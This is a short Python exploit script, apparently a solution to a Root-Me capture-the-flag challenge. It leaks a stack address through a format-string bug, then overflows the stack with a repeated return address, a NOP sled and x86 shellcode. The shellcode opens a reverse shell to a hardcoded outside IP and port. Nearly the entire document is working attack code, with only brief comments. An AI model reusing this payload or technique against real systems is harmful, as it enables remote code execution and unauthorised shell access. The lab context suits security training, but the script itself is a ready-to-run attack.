#the shellcode contain an obfscator for the push of /bin/bash because the code substitute n with 0 and 
#so it crashes trying to launch /bi0/bash. 

import socket
import sys 
import time 

SERVER = "challenge03.root-me.org"   #challenge03.root-me.org
PORT = 56520

s = socket.socket()
s.connect((SERVER, PORT))


#time.sleep(30) #useful for debugging

print "go go"

#exploiting the format string vulnerability in the code 
data = "%x%x%x%x\n"

s.sendall(data)

answer = s.recv(4096)

#receving the address
address = answer[0:8]
address = "0x"+address

print "dumped from stack with the format string "+address


address = int(address,16)+0x444 #this 0x444 offset assert that we will jump in the middle of the shellcode 

address = str(hex(address))


rets=address[:-1] #remove last char (L)


print "adding 0x444 and obtaining " + rets

#print rets

byte1=rets[8]+rets[9] #break the address in byte and finally compose the big endian string
byte2=rets[6]+rets[7]
byte3=rets[4]+rets[5]
byte4=rets[2]+rets[3]

byte1 = "0x"+byte1
byte2 = "0x"+byte2
byte3 = "0x"+byte3
byte4 = "0x"+byte4

print byte1+byte2+byte3+byte4

byte1 = chr(int(byte1,16))
byte2 = chr(int(byte2,16))
byte3 = chr(int(byte3,16))
byte4 = chr(int(byte4,16))

return_address = byte1+byte2+byte3+byte4

nopsled="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

shellcode = "\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x93\x6a\x01\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x31\xdb\xb0\x66\x43\x43\x68\x25\xbb\xe1\xbb\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\xbe\x2e\x61\x68\x6d\x81\xc6\x01\x01\x01\x01\x56\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"

exploit = nopsled+shellcode

#with 13 return address injected I will overwrite the return address of the main() with the address on the stack
#calculated before with the offset 0x444 and the leakage of the address from the format string bug
#the 'n' is exploited in order to exit from the main() and trigger the exploit

data=return_address+return_address+return_address+return_address+return_address+return_address+return_address+return_address+return_address+return_address+return_address+return_address+return_address+exploit+"\n"+"n\n"

print data

s.sendall(data) #goodbye hbinary2 :)

